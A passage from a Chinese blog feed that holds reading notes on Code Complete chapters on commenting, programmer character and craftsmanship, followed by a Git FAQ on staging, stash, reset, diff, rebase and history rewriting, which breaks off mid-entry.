Maximum</span><br></pre></td></tr></table></figure></li><li>用伪代码编程法减少注释时间。假如写代码前以注释先勾勒出代码，你就会占尽先机。完成代码之日，也是注释写好之时，不必再去专门花时间注释。由于在填充低层次的编程语言代码前，就已写出高层次的伪代码，因而可以获得所有设计方面的好处。</li><li>养成边写代码边写注释的好习惯，而不是在编写完代码后再去补注释</li><li>注释应表达代码的意图</li><li>代码本身应尽力做好说明</li><li>注释代码段时应注重“为何做（why）”而不是“怎么做（how）”</li><li>用注释为后边的内容做铺垫</li><li>让每个注释都有用。太多的注释只会把阐述的代码搞得含混不清。<strong>与其写很多注释，不如对代码本身的可读性下功夫</strong>。</li><li>说明非常规做法。如果你用不常用的方法以求提升性能，请用注释说明常用方法是如何实现，并量化你的方法提升了多少性能</li><li>不要使用缩略语。注释不应有歧义，应该易读且无需猜测缩写的含义。</li></ul><h3 id="最佳注释量"><a href="#最佳注释量" class="headerlink" title="最佳注释量"></a>最佳注释量</h3><p>IBM 研究指出，约每十条语句有一个注释，这样的密度时程序清晰度最高，过高或过低的 密度都会使代码难以理解。</p><p>如果熟练运用伪代码编程法，日久天长你就会每几行有个注释。不过，注释数目对方法本身起到副作用。与其操心注释数目，倒不如倾力于检查每个注释有无效用。如果注释说明了写某代码的来由，又符合本章确立的各原则，这样的注释就足够了。</p><h3 id="注释数据声明"><a href="#注释数据声明" class="headerlink" title="注释数据声明"></a>注释数据声明</h3><ul><li>注释数值单位。如果某数值表示长度，请指明长度单位是英寸、英尺、米还是千米。不要觉得单位不言自明——新手不知道。比较好的一种方式是，很多情况下可以<strong>将单位写进变量名，而不再用注释</strong>。表达式<code>distanceToSurface = marsLanderAltidude</code>也许正确，但<code>distanceToSurfaceInMeters = marsLanderAltidudeInFeet</code>则明显不对。</li><li>对数值的允许范围给出注释。如果变量值有一个期望范围，就应该说明这个范围。</li><li>注释编码含义。如 1001 表示用户认证错误，1002 表示服务配置错误等</li><li>注释对输入数据的限制。采用这种方法更能让代码具有自检能力。</li><li>注释“位标志”。如果变量用作位域，就应该说明每个数据位的含义</li><li>注释全局数据。如果使用了全局数据，要在其声明处做出注释。注释要指出该数据的目的、为何必须是全局数据。在使用此数据的每一处，都突出它是全局数据。好的命名规范是凸显变量全局性的首选办法，如果欠缺这样的规范，则可以用注释代劳。</li></ul><h3 id="注释子程序"><a href="#注释子程序" class="headerlink" title="注释子程序"></a>注释子程序</h3><ul><li>注释应靠近其说明的代码</li><li>在子程序上边用一两句话说明。如果不能用一两句话说清楚，有必要考虑你到底想让子程序做什么。</li><li>在声明参数处注释这些参数。注释并非说明的唯一形式，变量名取的足够好就能省掉注释。</li><li>利用诸如 Javadoc 之类的代码说明工具</li><li>分清输入与输入数据</li><li>注释接口假设。写子程序时，若意识到自己在做接口假设，应立即将其记录下来</li><li>对子程序的局限性做注释。如果子程序提供数值结果，请指出结果的精确度；要是某些条件下的计算没有定义，请标注这些条件；假定子程序碰到麻烦时有默认行为，请说明此行为；若希望子程序只工作于特定大小的数组或表格，请指出这一情况；如果你知道对程序做某些修改会损坏此子程序，请说明是哪些修改；如若开发子程序时想起什么问题，也请注释出来。</li><li>说明子程序的全局效果。如果子程序会修改全局数据，要确切描述它对全局数据做了些什么。</li><li>记录所用算法的来源。如果用了从一本书或杂志上得来的算法，请注释其出处的卷号和页码。如果是自行开发的算法，要指出在何处读者可以找到对其的解释。</li><li>用注释标记程序的各个部分</li></ul><h3 id="标注类的一般原则"><a href="#标注类的一般原则" class="headerlink" title="标注类的一般原则"></a>标注类的一般原则</h3><ul><li>说明局限性、用法假设等</li><li>注释类接口。其他程序员不看类实现就能明白类的用法吗？如果不是，类的封装就有严重问题。类接口应该包含别人使用该类时所需的全部信息。</li><li>不要在类接口处说明实现细节封装。最重要的一个规则是仅公开那些“需要，知道”的信息。若拿不定是否应公开某项信息，就隐藏之。因此，类接口文件应当只有类的用法信息，而不应有需要实现或维护类内操作的信息。</li></ul><h3 id="注释文件的一般原则"><a href="#注释文件的一般原则" class="headerlink" title="注释文件的一般原则"></a>注释文件的一般原则</h3><ul><li>说明各文件的意图和内容。如果文件包含多个类，请解释为何这些类需要放到一个文件中。假如将程序划分为多个源文件并非出于模块化的考虑，则对各文件用意的说明将对修改程序的程序员更有帮助。如果别人要找出做某事的子程序在哪儿，文件头注释有助于确定该文件含不含此子程序吗？</li><li>将姓名、邮件及电话号码等放到注释块中</li><li>包含版本控制标记</li><li>将文件命名为与其内容相关的名字</li></ul><p>Key Points</p><ul><li>该不该注释是个需要认真对待的问题。差劲的注释只会浪费时间，帮倒忙；好的注释才有价值。</li><li>源代码应当含有程序大部分的关键信息。只要程序依然在用，源代码比其他资料都能保持更新，故而将重要信息融入代码是很有用处的。</li><li>好代码本身就是最好的说明。如果代码太糟，需要大量注释，应先试着改进代码，直至无须过多注释为止。</li><li>注释应说出代码无法说出的东西——例如概述或用意等信息。</li><li>有的注释风格需要许多重复性劳动，应舍弃之，改用易于维护的注释风格。</li></ul><h2 id="第33章-个人性格"><a href="#第33章-个人性格" class="headerlink" title="第33章 个人性格"></a>第33章 个人性格</h2><p><strong>代码是70%的时间在阅读，30%的时间在运行；20%的时间在开发，80%的时间在维护。</strong><br>编程首先是与人交流，其次才是与计算机交流。</p><p>不要用8小时来维护2小时不在状态时写的代码。</p><p>承认自己的智力有限并通过学习来弥补，你会成为更好的程序员。<strong>你越是谦虚，进步就越快</strong>。</p><p>经过大量而长期的零零碎碎的工作，我们才成为实践与科学领域的权威专家。如果你能<strong>满怀信心地每天辛勤工作</strong>，早晚有一天会发现自己已成为这代人的佼佼者。    — 威廉 · 詹姆斯</p><p>犯错不是罪过，从中学不到什么才是罪过。</p><p>学习编程的一个特别好的途径是研究高手的程序。</p><p>技术带头人会为人写代码，而非机器。真正的高手所写的代码，像水晶一样晶莹剔透，还配有文档。他们可不会浪费其宝贵的脑力，去重新组织用一句注释就能说清楚的某块代码逻辑。</p><p>诚实：</p><ul><li>不是高手时不要假装是高手<ul><li>（如果你不懂装懂，还怎么学习新东西呢？最好还是装作自己啥都不懂，听听别人咋说，从他们那里学到新内容，并能了解他们是否真的清楚所讨论的东西）</li></ul></li><li>乐于承认错误</li><li>力图理解编译器的警告，而非置之不理</li><li>透彻理解自己的程序，而不要只是编译看看能否运行<ul><li>（请确保在将程序丢给编译器之前，你已经对其有了较大的把握）</li></ul></li><li>提供实际的状况报告</li><li>提供显示的进度方案，在上司面前坚持自己的意见<ul><li>（认真评估项目所需时间，将真实情况汇报，如果上司要求缩短时间，请坚持自己的意见，要么投入更多的人力，要么去掉一部分功能）</li></ul></li></ul><p>偷懒表现在一下方面：</p><ul><li>拖延不喜欢的任务</li><li>迅速做完不喜欢的任务，以摆脱之</li><li>编写某个工具来完成不喜欢的任务，以便再也不用做这样的事情了<ul><li>一劳永逸的懒，无疑是最具产值的偷懒形式</li></ul></li></ul><p><strong>有效编程中最重要的工作是<em>思考</em></strong>，而人思考时通常看上去不会很忙，如果和我共事的程序员总是忙个不停，我会认为他并非优秀的程序员，因为他没有用最有价值的工具——自己的脑袋。</p><p>多数时候软件开发中坚持其实就是没有好处的“固执”。当在某段新代码上卡壳时，坚持很难让人称道。不妨另辟蹊径，尝试重新设计类，或者绕过去，以后回头再试试。当一种办法行不通时，正好可以换个办法试试。</p><p>调试时，花 4 个小时干掉某个错误肯定会很有满足感；但通常最好只要有一段时间没有进展，比如 15 分钟，就该放弃排错过程，让潜意识仔细品品。想个其他法子将问题绕开：从头编写有麻烦的代码段；清理思绪后再来做。和计算机错误斗气是不明智的，更好的方法是避开它们。</p><p>知道何时放弃很难，但这是必须面对的问题。当你遭受挫折时，提出此问题正是时候。提出并不是说这是就放弃，而是该为目前的行为设置底线了：“要是这个方法30分钟内还不能解决问题，我就会花十分钟想些其他办法，再用一个小时尝试最可行的办法”。</p><p>任何日后出色的程序员前几年就做得很好。从那以后，程序员好坏就定型了。——比尔 · 盖茨</p><p>Key Point</p><ul><li>人的个性对其编程能力有直接影响</li><li>最有关系的性格为：谦虚、求知欲、诚实、创造性和纪律，以及高明的偷懒</li><li>程序员高手的性格与天分无关，而任何事都与个人发展相关</li><li>出乎意料的是，小聪明、经验、坚持和疯狂既有助也有害</li><li>很多程序员不愿主动吸收新的知识和技术，只依靠工作时偶尔接触新的信息。如果能抽出少量时间阅读和学习编程知识，要不了多久就能鹤立鸡群</li><li>好性格与培养正确的习惯关系甚大。要成为杰出的程序员，先要养成良好习惯，其他自然水到渠成</li></ul><h2 id="第34章-软件工艺的话题"><a href="#第34章-软件工艺的话题" class="headerlink" title="第34章 软件工艺的话题"></a>第34章 软件工艺的话题</h2><h3 id="征服复杂性"><a href="#征服复杂性" class="headerlink" title="征服复杂性"></a>征服复杂性</h3><p>软件开发的核心是降低系统的复杂度</p><ul><li>如果采用定义良好的一致的类接口，就无须操心类的实现细节，从而简化自己的工作。</li><li>采用编码规范主要也是为了降低复杂度。</li><li>各种形式的抽象对于管理复杂度都是很强大的工具。计算机科学最了不起的成就就是从机器语言跃进到高级语言（程序员不再操心特定的硬件细节，而能专心于编程），子程序的想法则是另一个巨大的进步，随后的进步是类和程序包。</li><li>以功能对变量命名能提升抽象层次。</li></ul><h3 id="精选开发过程"><a href="#精选开发过程" class="headerlink" title="精选开发过程"></a>精选开发过程</h3><ul><li>对于小项目，程序员的个人才能对软件质量影响最大；对于多人协作的项目，组织性的重要超过了个人技能。</li><li>需求失误的成本远高于构建错误</li><li>打好地基后再盖房子</li><li>软件开发中，质量一开始就要逐步建立起来。那种先拼凑代码，再通过测试提出缺陷的思路是完全错误的。</li><li>不成熟的优化是另一个过程性错误。行之有效的开发过程是在开始时粗调，后来再进行精调。如果你是个雕刻匠，应在打磨细节前就将大致的轮廓刻画出来。过早优化浪费时间，因为你会花时间去精雕细琢原本不必做的代码段。你可能会打磨本已足够短小足够快速的代码段；你可能会润色日后将要丢弃的代码。</li><li>如果遵照写伪代码再对其填充代码的步骤，就能享受到自上而下的设计好处。你也应确保向代码中加入注释，而不是以后再添加进去。</li></ul><h3 id="首先为人写程序，其次才是机器"><a href="#首先为人写程序，其次才是机器" class="headerlink" title="首先为人写程序，其次才是机器"></a>首先为人写程序，其次才是机器</h3><p>差的程序：好似迷宫一样令人摸不清方向，夹杂着各种花招和无关注释。<br>好的程序：算法精准，结构紧凑，性能好，注释清晰得体。</p><ul><li>好的程序在以下方面都有正面影响：<ul><li>可理解性</li><li>容易复查</li><li>错误率</li><li>调试</li><li>可修改性</li><li>开发时间——上述因素之综合</li><li>外在质量——上述因素之综合</li></ul></li><li>可读的代码写起来并不比含糊的代码多花时间，运行时至少不比后者慢。如果你能轻松阅读自己写的代码，确保该代码能工作也会更容易。</li><li>使代码可读性好并非是开发过程中的可有可无部分，为了节省编写代码的时间而不顾阅读它的时间，是不经济的。你应该努力写好代码,这可以一次做到的；这远比你努力去读坏代码划算，因为那不得不一次次地反复做。</li><li>提高可读性的方法：好的类名(及子程序名、变量名)、精心的布局、短小的子程序；将复杂的逻辑测试隐藏在布尔函数中；把中间结果赋值给变量，以使复杂运算清晰化等等。任何单一的技术对程序可读性的改善都是些许的，但许多微小的改进迭加起来，就能使程序面貌一新。</li></ul><h3 id="借助规范集中注意力"><a href="#借助规范集中注意力" class="headerlink" title="借助规范集中注意力"></a>借助规范集中注意力</h3><ul><li>规范能够精确地传达重要信息。采用命名规范后，区区一个字符就可以区分局部变量、类变量和全局变量；大小写字母能精确区别类型、具名常量和变量;对齐规范能够精确指示出语句间的关系。</li><li>规范可以使你免除各种风险。通过建立禁止使用危险做法的规范，可以在需要用它们时限制这些做法，或者防范它们可能的危险。例如，通过禁止全局变量或在一行里写多条语句，避免这些危险的用法。通过要求对复杂表达式加括号、在指针被删除后要置空以防误用，防范可能的危险。</li><li>规范增加了对底层工作的可预见性。对存储器请求、错误、输入/输出和类接口有规范的处理，能够为代码加入有意义的结构，便于其他程序员弄懂你的程序。全局变量让读者变得没有把握。有了好的规范，你和你的读者就有了更好的默契，就能减少必须消化的细节数量，反过来又进一步加深了对程序的理解。</li><li>在大型项目工作中，有时程序员们会规范过了头。由于设立许多规范和原则,光是记住这些东西都颇花时间。但小型项目的程序员常常缺少规范，则是因为没有充分体会到自觉遵守规范时的好处。应理解其真正价值，并充分利用规范；使用规范以提供所需的结构。</li></ul><h3 id="当心落石"><a href="#当心落石" class="headerlink" title="当心落石"></a>当心落石</h3><ul><li>一天写了一大堆代码，之后花两个星期去调试不是巧妙的办法</li><li>深入一个程序时，应注意那些指示程序中某些地方设计欠佳的警告信息。不容易写注释，不容易命名变量，不容易将问题分解成接口清晰的几个类，都说明编码前还需要再考虑设计。无聊的命名或者无法在注释中精确地描述一段代码的意思，同样是不好的信号。到你对设计胸有成竹时，底层的细节代码就会如泉涌而来。</li><li>警惕程序出现难以理解的迹象。任何不安都是暗示。要是连你都觉得难，以后的程序员就更不用提了。如果你能费神地改进程序，他们会感激你的。不是看懂代码，而是靠猜测来理解代码，同样也说明代码太复杂。有难度就说明有问题，所以应设法简化之。</li><li>找不到错误最常见的原因常常是因为忽视错误，这些错误在测试输出中能够看到，却没有人注意。</li><li>关注警告信息与否也直接影响到最终产品的质量。</li></ul><hr><blockquote><p>读后感：在编程的世界里，虽然各种语言百花齐放，但我们所遇到的大部分的问题都是相似的。幸好我们处在了技术语言的成熟期，而且所遇到的 99% 的问题 Google 都已经有了答案。</p><p>在编程中最困难的问题仍然是人的问题，比如团队协作、代码风格、代码质量等。任何竞争的本质都是人的竞争，而人在做任何工作时都要勤于思考，互联网的普及让每个人更加便捷的获取知识。我们只有不断向优秀的人学习，持续思考，才能让每一天都不一样。当我们在向上看到语言框架百花齐放时，更需要向下关注计算机基础，并且不要让自己局限在一门语言中。没有最好的工具，只有最合适的工具。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git 常用命令 FAQ</title>
      <link href="/post/git-faq/"/>
      <url>/post/git-faq/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7blak7yufj30wk09gmyk.jpg" alt="git图解"></p><a id="more"></a><p>在开始前，让我们先来讲几个概念，这将更好的让我们理解接下来的内容：</p><h4 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h4><p>我们正在编辑的内容就是在工作区，上图中的 workspace。</p><h4 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h4><p>我们将工作区的内容通过<code>git add</code>命令就提交到了暂存区。 上图中的 index</p><h4 id="本地仓库"><a href="#本地仓库" class="headerlink" title="本地仓库"></a>本地仓库</h4><p>我们将暂存区的内容通过<code>git commit</code>就提交到了本地仓库。内容的修改从工作区 ==&gt; 暂存区 ==&gt; 本地仓库是顺序执行的。上图中的 repository</p><h4 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h4><p>Git 是一个分布式管理工具，所以当我们将修改的内容提交到本地仓库后，就可以通过<code>git push</code>命令推送到远程仓库与他人协作完成项目。</p><h4 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h4><p>分支可以理解为像树枝一样来管理我们的代码，分支很好的解决了多人协作的问题。当我们需要开发一个新的功能时，从稳定分支（通常是 master 或者 release）新建分支开发，当开发完成并测试通过后，再通过<code>git merge</code>合并入稳定分支发布。</p><h1 id="FAQ"><a href="#FAQ" class="headerlink" title=" FAQ "></a><center> FAQ </center ></h1><h2 id="工作区-1"><a href="#工作区-1" class="headerlink" title="工作区"></a>工作区</h2><h3 id="怎样将工作区中的内容提交到暂存区？"><a href="#怎样将工作区中的内容提交到暂存区？" class="headerlink" title="怎样将工作区中的内容提交到暂存区？"></a>怎样将工作区中的内容提交到暂存区？</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">add</span><span class="bash"> [./filename]</span></span><br></pre></td></tr></table></figure><h3 id="我在工作区修改了一些文件用于调试，完成后想丢弃所有修改"><a href="#我在工作区修改了一些文件用于调试，完成后想丢弃所有修改" class="headerlink" title="我在工作区修改了一些文件用于调试，完成后想丢弃所有修改"></a>我在工作区修改了一些文件用于调试，完成后想丢弃所有修改</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout .</span><br></pre></td></tr></table></figure><h3 id="我想丢弃某个文件的修改"><a href="#我想丢弃某个文件的修改" class="headerlink" title="我想丢弃某个文件的修改"></a>我想丢弃某个文件的修改</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout --<span class="string">[filename]</span></span><br></pre></td></tr></table></figure><h3 id="我想暂存这些调试的代码"><a href="#我想暂存这些调试的代码" class="headerlink" title="我想暂存这些调试的代码"></a>我想暂存这些调试的代码</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git stash</span><br></pre></td></tr></table></figure><h3 id="我想看看有哪些暂存的内容"><a href="#我想看看有哪些暂存的内容" class="headerlink" title="我想看看有哪些暂存的内容"></a>我想看看有哪些暂存的内容</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash <span class="built_in">list</span></span><br></pre></td></tr></table></figure><h3 id="我想将某个暂存的内容复制到工作区"><a href="#我想将某个暂存的内容复制到工作区" class="headerlink" title="我想将某个暂存的内容复制到工作区"></a>我想将某个暂存的内容复制到工作区</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash apply <span class="symbol">stash@</span>&#123;n&#125;</span><br></pre></td></tr></table></figure><h3 id="我想将某个暂存的内容剪切到工作区"><a href="#我想将某个暂存的内容剪切到工作区" class="headerlink" title="我想将某个暂存的内容剪切到工作区"></a>我想将某个暂存的内容剪切到工作区</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash <span class="keyword">pop</span> stash@&#123;n&#125;</span><br></pre></td></tr></table></figure><h3 id="我想删除某个暂存"><a href="#我想删除某个暂存" class="headerlink" title="我想删除某个暂存"></a>我想删除某个暂存</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash drop <span class="symbol">stash@</span>&#123;n&#125;</span><br></pre></td></tr></table></figure><h3 id="我想删除所有暂存内容"><a href="#我想删除所有暂存内容" class="headerlink" title="我想删除所有暂存内容"></a>我想删除所有暂存内容</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash <span class="built_in">clear</span></span><br></pre></td></tr></table></figure><h3 id="我想将-git-中的某个文件取消跟踪，并保留本地文件"><a href="#我想将-git-中的某个文件取消跟踪，并保留本地文件" class="headerlink" title="我想将 git 中的某个文件取消跟踪，并保留本地文件"></a>我想将 git 中的某个文件取消跟踪，并保留本地文件</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rm --cached <span class="string">[filename]</span></span><br></pre></td></tr></table></figure><h3 id="已跟踪的文件也要每次-add-后-commit-吗？"><a href="#已跟踪的文件也要每次-add-后-commit-吗？" class="headerlink" title="已跟踪的文件也要每次 add 后 commit 吗？"></a>已跟踪的文件也要每次 add 后 commit 吗？</h3><p>不需要，可以使用 <code>git commit -am &#39;msg&#39;</code> 合并两个命令</p><h3 id="我回退到了某个提交，如何再重新回到最新的提交？"><a href="#我回退到了某个提交，如何再重新回到最新的提交？" class="headerlink" title="我回退到了某个提交，如何再重新回到最新的提交？"></a>我回退到了某个提交，如何再重新回到最新的提交？</h3><p><code>git reflog</code>命令记录了你的操作记录，在这里你可以找到最新的提交，使用<code>git reset [commit-id]</code>即可回到未来。</p><h2 id="暂存区-1"><a href="#暂存区-1" class="headerlink" title="暂存区"></a>暂存区</h2><h3 id="我想将暂存区的文件还原到工作区"><a href="#我想将暂存区的文件还原到工作区" class="headerlink" title="我想将暂存区的文件还原到工作区"></a>我想将暂存区的文件还原到工作区</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="meta">reset</span> ./<span class="meta">filename</span></span><br></pre></td></tr></table></figure><blockquote><p>在<code>git reset</code>中，有<code>--mixed</code>（默认）, <code>--soft</code>，<code>--hard</code>三个可选参数，它们间有什么区别呢？其实是他们的修改作用域不同，具体可看下表。需要注意的是，请谨慎使用<code>--hard</code>，这会使你工作区的内容被覆盖！</p></blockquote><table><thead><tr><th align="center"></th><th align="center">工作区</th><th align="center">暂存区</th><th align="center">本地仓库</th></tr></thead><tbody><tr><td align="center"><code>--soft</code></td><td align="center">❌</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td align="center"><code>--mixed</code></td><td align="center">❌</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td align="center"><code>--hard</code></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr></tbody></table><h3 id="我想对比工作区域暂存区的某个文件差异"><a href="#我想对比工作区域暂存区的某个文件差异" class="headerlink" title="我想对比工作区域暂存区的某个文件差异"></a>我想对比工作区域暂存区的某个文件差异</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff <span class="string">[filename]</span></span><br></pre></td></tr></table></figure><h3 id="我想对比暂存区与仓库某个文件的差异"><a href="#我想对比暂存区与仓库某个文件的差异" class="headerlink" title="我想对比暂存区与仓库某个文件的差异"></a>我想对比暂存区与仓库某个文件的差异</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">diff </span>--<span class="keyword">cached </span>[filename]</span><br></pre></td></tr></table></figure><h3 id="我想比较工作区与本地仓库的差异"><a href="#我想比较工作区与本地仓库的差异" class="headerlink" title="我想比较工作区与本地仓库的差异"></a>我想比较工作区与本地仓库的差异</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git diff HEAD</span><br></pre></td></tr></table></figure><h3 id="我想比较当前提价与某个历史提交的差异"><a href="#我想比较当前提价与某个历史提交的差异" class="headerlink" title="我想比较当前提价与某个历史提交的差异"></a>我想比较当前提价与某个历史提交的差异</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff [<span class="keyword">commit</span>-<span class="keyword">id</span>]</span><br></pre></td></tr></table></figure><h2 id="本地仓库-1"><a href="#本地仓库-1" class="headerlink" title="本地仓库"></a>本地仓库</h2><h3 id="怎么将远程仓库克隆到本地，并命名为proj？"><a href="#怎么将远程仓库克隆到本地，并命名为proj？" class="headerlink" title="怎么将远程仓库克隆到本地，并命名为proj？"></a>怎么将远程仓库克隆到本地，并命名为proj？</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">clone</span> <span class="title">[repo_url</span>] [proj]</span><br></pre></td></tr></table></figure><h3 id="怎么更新本地仓库？"><a href="#怎么更新本地仓库？" class="headerlink" title="怎么更新本地仓库？"></a>怎么更新本地仓库？</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch <span class="variable">&amp;&amp;</span> git <span class="meta">merge</span></span><br></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git pull</span><br></pre></td></tr></table></figure><h2 id="变基"><a href="#变基" class="headerlink" title="变基"></a>变基</h2><p>变基的命令：<code>git rebase -i [要修改 commit 的上一个 commit]</code></p><blockquote><p>请注意！变基是一把利剑，合理的使用会让你的分支更加简洁和灵活，滥用则会导致分支的混乱。请谨慎使用 rebase，尤其是团队合作项目，因为它会修改历史信息，导致信息冲突<br>在危险操作前可以先在副本分支进行操作，确认结果是预期后再行操作。</p></blockquote><blockquote><p>变基的概念可能难以理解，你可以到<a href="https://git-scm.com/book/zh/v2/Git-分支-变基" target="_blank" rel="noopener">这里</a>学习一下。</p></blockquote><p>当我们使用<code>git rebase -i 5f2452b2  8f33126c</code>调出了变基窗口时，会看到以下内容，请注意其中的 Commands 部分，每个命令后都有说明，我们只需要按照说明操作即可。如果不明白其实际动作和结果，请创建一个测试仓库演练一下。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pick cacc52da <span class="keyword">add</span><span class="bash">: qrcode</span></span><br><span class="line">pick f072ef48 update: indexeddb hack</span><br><span class="line">pick <span class="number">4</span>e84901a feat: <span class="keyword">add</span><span class="bash"> indexedDB floder</span></span><br><span class="line">pick <span class="number">8</span>f33126c feat: <span class="keyword">add</span><span class="bash"> test2.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rebase 5f2452b2..8f33126c onto 5f2452b2 (4 commands)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Commands:</span></span><br><span class="line"><span class="comment"># p, pick = use commit</span></span><br><span class="line"><span class="comment"># r, reword = use commit, but edit the commit message</span></span><br><span class="line"><span class="comment"># e, edit = use commit, but stop for amending</span></span><br><span class="line"><span class="comment"># s, squash = use commit, but meld into previous commit</span></span><br><span class="line"><span class="comment"># f, fixup = like "squash", but discard this commit's log message</span></span><br><span class="line"><span class="comment"># x, exec = run command (the rest of the line) using shell</span></span><br><span class="line"><span class="comment"># d, drop = remove commit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># These lines can be re-ordered; they are executed from top to bottom.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If you remove a line here THAT COMMIT WILL BE LOST.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># However, if you remove everything, the rebase will be aborted.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note that empty commits are commented out</span></span><br></pre></td></tr></table></figure><h3 id="我想修改某次提交信息"><a href="#我想修改某次提交信息" class="headerlink" title="我想修改某次提交信息"></a>我想修改某次提交信息</h3><p><code>r</code></p><h3 id="我想将多个提交合并"><a href="#我想将多个提交合并" class="headerlink" title="我想将多个提交合并"></a>我想将多个提交合并</h3><p><code>s</code></p><h3 id="我想删除某次提交"><a href="#我想删除某次提交" class="headerlink" title="我想删除某次提交"></a>我想删除某次提交</h3><p><code>d</code></p><h3 id="我想将-A-分支变基到-B-分支上（移花接木）"><a href="#我想将-A-分支变基到-B-分支上（移花接木）" class="headerlink" title="我想将 A 分支变基到 B 分支上（移花接木）"></a>我想将 A 分支变基到 B 分支上（移花接木）</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rebase -<span class="selector-tag">i</span> A B</span><br></pre></td></tr></table></figure><h3 id="我更换了邮箱，想修改历史提交的邮箱"><a href="#我更换了邮箱，想修改历史提交的邮箱" class="headerlink" title="我更换了邮箱，想修改历史提交的邮箱"></a>我更换了邮箱，想修改历史提交的邮箱</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">filter</span>-branch <span class="comment">--commit-filter '</span></span><br><span class="line">        <span class="keyword">if</span> [ "$GIT_AUTHOR_EMAIL" = "schacon@localhost" ];</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                GIT_AUTHOR_NAME="Scott Chacon";</span><br><span class="line">                GIT_AUTHOR_EMAIL="schacon@example.com";</span><br><span class="line">                git <span class="keyword">commit</span>-tree "$@";</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                git <span class="keyword">commit</span>-tree "$@";</span><br><span class="line">        fi<span class="string">' HEAD</span></span><br></pre></td></tr></table></figure><h3 id="我想在所有分支删除某个文件，如-password-txt"><a href="#我想在所有分支删除某个文件，如-password-txt" class="headerlink" title="我想在所有分支删除某个文件，如 password.txt"></a>我想在所有分支删除某个文件，如 password.txt</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">filter</span>-branch --<span class="keyword">all</span> --tree-<span class="built_in">filter</span> <span class="string">'rm -f passwords.txt'</span> HEAD</span><br></pre></td></tr></table></figure><h3 id="变基冲突解决后我该做什么？"><a href="#变基冲突解决后我该做什么？" class="headerlink" 